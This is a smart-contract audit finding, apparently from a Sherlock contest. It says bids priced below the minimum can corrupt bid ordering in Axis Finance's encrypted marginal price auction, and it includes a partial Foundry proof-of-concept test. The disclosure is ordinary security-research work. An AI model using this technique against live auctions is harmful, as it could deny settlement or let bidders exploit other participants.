Virtual Bubblegum Yak

medium

# A malicious actor can manipulate the ordering of bids, resulting in detrimental exploits of the axis-finance protocol

## Summary
After an ``EMPAM`` auction is concluded it has to be decrypted, during this operation the bids will be ordered in descending order based on their price. However there is a problem, a malicious actor can provide a bid that results in a price that is below the ``minPrice`` set by the seller of the protocol, and due to the implementation of the [_swim()](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/MaxPriorityQueue.sol#L52-L57) function this will mismatch the order of the bids, and they won't be ordered in a discending way. This is a detrimental impact for the protocol, as it will either dos the whole auction, based on the ``minFillAmount`` set by the seller, or open a frontrunning opportunity for bidders to claim their rewards, as the ``marginalPrice`` will be the ``minPrice``, this defeats the whole purpose of the EMPAM auction.
## Vulnerability Detail
[Gist](https://gist.github.com/AtanasDimulski/48947274cd9b3dd3d948ef39aa993f67)

After following the steps in the above provided [gist](https://gist.github.com/AtanasDimulski/48947274cd9b3dd3d948ef39aa993f67) add the following test to ``AuditorForkTests.t.sol`` file

```solididty
function test_ManipulatePriceOrdering() public {
        deployEMPAMAuction();

        vm.startPrank(bob);
        uint96 amountBob = 35; // Min price is set to 28, this is higher than it roughly 35 QuoteTokens(USDC) tokens for 1e18 baseTokens(SHIB)
        mockQuoteToken.mint(bob, amountBob);
        mockQuoteToken.approve(address(auctionHouse), type(uint256).max);
        uint256 amountOutBob = 1e18;
        uint256 salt = uint256(keccak256(abi.encodePacked(uint96(0), bob, amountBob)));

        // Encrypt the message
        (uint256 ciphertextB, Point memory ciphertextPubKeyB) =
            ECIES.encrypt(amountOutBob, recipientPubKey, privateKey, salt);

        Router.BidParams memory bidParamsB = Router.BidParams({
            lotId: uint96(0),
            referrer: address(0),
            amount: amountBob,
            auctionData: abi.encode(ciphertextB, ciphertextPubKeyB),
            permit2Data: ""
        });
        bytes memory callbackData_;
        auctionHouse.bid(bidParamsB, callbackData_);
        vm.stopPrank();

        maliciousBidAttacker();

        vm.startPrank(john);
        uint96 amountJohn = 37;
        mockQuoteToken.mint(john, amountJohn);
        mockQuoteToken.approve(address(auctionHouse), type(uint256).max);
        uint256 amountOutJohn = 1e18;
        uint256 saltJ = uint256(keccak256(abi.encodePacked(uint96(0), john, amountJohn)));

        // Encrypt the message
        (uint256 ciphertextJ, Point memory ciphertextPubKeyJ) =
            ECIES.encrypt(amountOutJohn, recipientPubKey, privateKey, saltJ);

        Router.BidParams memory bidParamsJ = Router.BidParams({
            lotId: uint96(0),
            referrer: address(0),
            amount: amountJohn,
            auctionData: abi.encode(ciphertextJ, ciphertextPubKeyJ),
            permit2Data: ""
        });
        auctionHouse.bid(bidParamsJ, callbackData_);
        vm.stopPrank();

        maliciousBidAttacker();
        createBidTom();

        vm.startPrank(rob);
        uint96 amountRob = 36;
        mockQuoteToken.mint(rob, amountRob);
        mockQuoteToken.approve(address(auctionHouse), type(uint256).max);
        uint256 amountOutRob = 1e18;
        uint256 saltR = uint256(keccak256(abi.encodePacked(uint96(0), rob, amountRob)));

        // Encrypt the message
        (uint256 ciphertextR, Point memory ciphertextPubKeyR) =
            ECIES.encrypt(amountOutRob, recipientPubKey, privateKey, saltR);

        Router.BidParams memory bidParamsR = Router.BidParams({
            lotId: uint96(0),
            referrer: address(0),
            amount: amountRob,
            auctionData: abi.encode(ciphertextR, ciphertextPubKeyR),
            permit2Data: ""
        });
        auctionHouse.bid(bidParamsR, callbackData_);
        vm.stopPrank();

        vm.rollFork(15_470_093);
        encryptedMarginalPriceAuctionModule.submitPrivateKey(uint96(0), privateKey, uint64(6));
        auctionHouse.settle(uint96(0));   
    }
```

```solididty
Logs:
  Here is the amount In:  200
```

From the above logs, we see that only a below min price is entered in the _getLotMarginalPrice() function.

NOTE: Due to time constraints the poc doesn't fully exploit the protocol, but demonstrates that it is put in a state which van easily be exploited by the impact described in the impact section. If more information is needed fell free to request a better PoC during the judging phase
## Impact
This is a detrimental impact for the protocol, as it will either dos the whole auction, based on the ``minFillAmount`` set by the seller, or open a frontrunning opportunity for bidders to claim their rewards, as the ``marginalPrice`` will be the ``minPrice``, this defeats the whole purpose of the EMPAM auction.

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/lib/MaxPriorityQueue.sol#L52-L57

## Tool used
Manual Review

## Recommendation
Consider a way that to delete all prices that are below the minPrice set by the seller, when prices are being ordered in the ``MaxPriorityQueue.sol`` file